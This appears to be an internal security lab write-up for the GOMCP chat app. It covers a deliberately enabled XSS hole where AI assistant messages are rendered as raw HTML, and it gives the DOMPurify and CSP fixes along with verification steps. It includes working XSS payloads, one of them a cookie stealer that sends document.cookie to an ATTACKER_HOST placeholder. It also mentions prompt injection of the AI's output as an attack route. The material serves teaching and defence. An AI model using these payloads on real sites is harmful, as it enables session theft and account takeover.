# 01 — Cross-Site Scripting (XSS)

**OWASP Category:** A03 Injection  
**Owner:** Zane  
**Status:** Implemented (Phase 2)

---

## Background

Cross-Site Scripting (XSS) occurs when an application takes untrusted input and includes it in an HTTP response in a way that allows the browser to execute it as code. In GOMCP, the AI assistant's response is rendered directly into the DOM. If an attacker can influence the response content (e.g., through prompt injection, a compromised backend, or a reflected payload during testing), they can execute arbitrary JavaScript in the victim's browser.

**Impact:** Session cookie theft, credential harvesting, keylogging, DOM manipulation, full account takeover.

---

## Vulnerability Location

**File:** `security/web/src/pages/ChatPage.tsx`  
**Condition:** `VITE_VULN_MODE=true`

```tsx
// VULNERABLE — raw HTML rendered without sanitization
<div dangerouslySetInnerHTML={{ __html: msg.content }} />
```

The `dangerouslySetInnerHTML` prop bypasses React's default escaping and injects the raw string directly into the DOM. Any HTML or JavaScript in `msg.content` will be parsed and executed by the browser.

---

## Attack Steps

### Prerequisites

1. Start the backend: `go run .`
2. Start the frontend in vulnerable mode:
   ```bash
   cd security/web
   VITE_VULN_MODE=true npm run dev
   ```
3. Open `http://localhost:5173` and log in.

### Payload 1 — Alert PoC

In the chat input, type:

```
<script>alert('XSS by Zane')</script>
```

**Expected result (VULN_MODE=true):** A browser alert dialog fires.

> Note: `<script>` tags injected via `innerHTML` are not executed by modern browsers — use the `<img>` vector below for a reliable PoC.

### Payload 2 — img onerror (reliable)

```
<img src=x onerror="alert('XSS: ' + document.cookie)">
```

**Expected result (VULN_MODE=true):** Alert fires with `document.cookie` content.

### Payload 3 — Session Cookie Stealer

Replace `ATTACKER_HOST` with a server you control (e.g., a `nc -l 8888` listener or a request-bin URL):

```
<img src=x onerror="fetch('https://ATTACKER_HOST/steal?c='+encodeURIComponent(document.cookie))">
```

**Expected result (VULN_MODE=true):** The victim's session cookie is sent to the attacker's server.

### Automation Script

```bash
bash security/scripts/01-xss-attack.sh
```

---

## Mitigation

### 1 — Replace `dangerouslySetInnerHTML` with DOMPurify

**File:** `security/web/src/pages/ChatPage.tsx`

```diff
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useRef, useState } from "react";
+import DOMPurify from "dompurify";

-<div dangerouslySetInnerHTML={{ __html: msg.content }} />
+<div
+  dangerouslySetInnerHTML={{
+    __html: DOMPurify.sanitize(msg.content, {
+      ALLOWED_TAGS: ["b", "i", "em", "strong", "code", "pre", "p", "br", "ul", "ol", "li"],
+      ALLOWED_ATTR: [],
+    }),
+  }}
+/>
```

DOMPurify strips all event handlers and dangerous elements while preserving safe formatting tags.

### 2 — Content-Security-Policy header (defence in depth)

Set in `web_server.go` when `VULN_MODE=false`:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
```

This prevents inline scripts and external script sources from executing even if an XSS payload slips through.

---

## Verification Test

### VULN_MODE=true (attack succeeds)

```bash
# Navigate to the chat and send the onerror payload via the UI.
# An alert dialog should fire.
echo "PASS if alert fires"
```

### VULN_MODE=false (attack is blocked)

```bash
# Send the same payload.
# DOMPurify strips the onerror attribute; no alert fires.
# The img tag is removed entirely.
echo "PASS if no alert and the payload appears as plain text or is absent"
```

Check the rendered DOM with browser DevTools — `<img src=x onerror=...>` should not appear.

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [React docs: dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
